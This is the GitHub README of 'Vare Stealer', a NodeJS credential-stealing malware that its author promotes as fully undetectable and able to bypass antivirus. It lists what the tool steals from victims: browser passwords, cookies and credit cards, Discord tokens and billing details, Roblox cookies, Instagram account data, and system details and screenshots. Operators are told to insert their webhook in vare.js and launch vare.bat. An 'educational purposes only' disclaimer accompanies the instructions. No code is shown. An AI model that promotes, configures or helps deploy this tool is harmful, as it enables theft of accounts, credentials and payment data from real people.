
<!-- PROJECT LOGO -->
<br />
<p align="center">
  <kbd>
  <a href="https://github.com/saintdaddy/Vare-Stealer">
    <img src="https://media.discordapp.net/attachments/1096469835489235079/1096626377035370627/Comp_1_00001sss.png?width=558&height=558" alt="Logo" width="250" height="250">
    </kbd>
  </a>

  <h3 align="center">Vare Stealer</h3>

  <p align="center">
    Fully Undetected Discord Browser Stealer
    <br />
    <a href="https://t.me/varestealer"><strong>Telegram Channel</strong></a>
    <br />
    <br />
    <a href="https://github.com/saintdaddy/Vare-Stealer/issues">Report Bug</a>
    ·
    <a href="https://github.com/saintdaddy/Vare-Stealer/issues">Request Feature</a>
    ·
    <a href="https://github.com/saintdaddy/Vare-Stealer/pulls">Send a Pull Request</a>
  </p>
</p>

<!-- ABOUT THE PROJECT -->

## About The Project

Vare Written in NodeJS, bypassing all anti viruses during runtime and scantime, Fully Undetectable Discord, Roblox, Browser Stealer. If you want to check out the stealer's look, keep scrolling down.

> :star: 57 Stars = Gmail Cookie Checker

## Features
```batch
┌──(Saint@root)-[~/]
└─$ cat VareStuffs

@BrowserStuffs
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Passwords - From All Browsers And Profiles
| Cookies - From All Browsers And Profiles
| AutoFills - From All Browsers And Profiles
| CreditCards - From All Browsers And Profiles
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

@DiscordStuffs
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Tokens - From All Clients
| Rare Friends - From Token's Friend List
| HQ Guilds - 500+ member servers where the token is admin/owner
| Nitro Type and Month - From Discord Token
| Billing Type - From Discord Token
| Badges - From Discord Token
| E mail - From Discord Token
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

@PCStuffs
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Hostname
| Ram Size
| CPU
| Windows Version
| Uptime
| Home Directory
| PC Name
| HWID
| Screenshot
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

@RobloxStuffs
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Roblox Cookie
| Robux
| Roblox ID
| Roblox Name
| Roblox Premium Status
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

@InstagramStuffs
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
| Username
| Follower Count
| Follows Count
| Mail
| Phone Number
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
```


## Installation
You are need NodeJS16 for this project [Download NodeJS](https://nodejs.org/en/blog/release/v16.16.0)

And you are need also Python for this project [Download Python](https://www.python.org/downloads/)

Anddd you are need C++/Visual Studio/Visual Studio Build Tools

<!-- GETTING STARTED -->
## Getting Started

Replace your webhook in `vare.js` then

Open the `vare.bat` for simply menu

![image](https://user-images.githubusercontent.com/111476645/231452411-4648b116-72e9-41dc-8f9c-54000b269593.png)


<!-- CONTRIBUTING -->
## 🤝 Contributing

If you want to support me and my project, you can do the following, **thank you**

1. Fork the Project
2. Star the Project
3. Open a Pull Request

## Screenshots
<img src="https://user-images.githubusercontent.com/111476645/231453417-aadae0fd-f566-4427-b388-fee32ea8a794.png" width="500">

<img src="https://user-images.githubusercontent.com/111476645/231453449-f503d5c2-7c44-44f1-be26-c044e31228ab.png" width="500">

<img src="https://user-images.githubusercontent.com/111476645/231453472-9fef9e90-24f9-441e-9da0-9516411c3b8d.png" width="500">

<img src="https://user-images.githubusercontent.com/111476645/231453485-e9204edf-5979-4730-88f8-f880e00b6d30.png" width="500">

<img src="https://user-images.githubusercontent.com/111476645/232208596-2ab1d4d3-1a12-43a2-8aaf-dccd0edf3347.png" width="500">


## 🛑 Note
I am not responsible in any way for any damage that may be caused by this program, it is shared for educational purposes only.


<!-- CONTACT -->
## 📫 Contact

https://t.me/varestealer


